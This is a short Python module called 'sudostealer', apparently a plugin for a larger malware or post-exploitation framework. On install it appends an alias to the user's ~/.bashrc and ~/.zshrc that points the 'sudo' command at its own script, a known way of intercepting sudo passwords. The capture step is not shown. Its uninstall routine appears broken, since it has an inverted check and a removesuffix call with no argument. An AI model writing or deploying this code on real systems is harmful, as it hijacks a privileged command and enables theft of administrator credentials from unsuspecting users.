#!/usr/bin/env python3

import os

rcs = ["~/.bashrc","~/.zshrc"]
append = f"\nalias sudo='{os.path.abspath(__file__)}'"

def set_alias():
	for i in rcs:
		i = os.path.expanduser(i)
		if os.path.exists(i):
			with open(i, 'r') as f:
				content = f.read()
			if not content.endswith(append):
				with open(i, 'a') as f:
					f.write(append)

def remove_alias():
	for i in rcs:
		i = os.path.expanduser(i)
		if os.path.exists(i):
			with open(i, 'r') as f:
				content = f.read()
			if not content.endswith(append):
				with open(i, 'w') as f:
					f.write(content.removesuffix())

modules["sudostealer"] = {}
modules["sudostealer"]["oninstall"] = set_alias
modules["sudostealer"]["onuninstall"] = remove_alias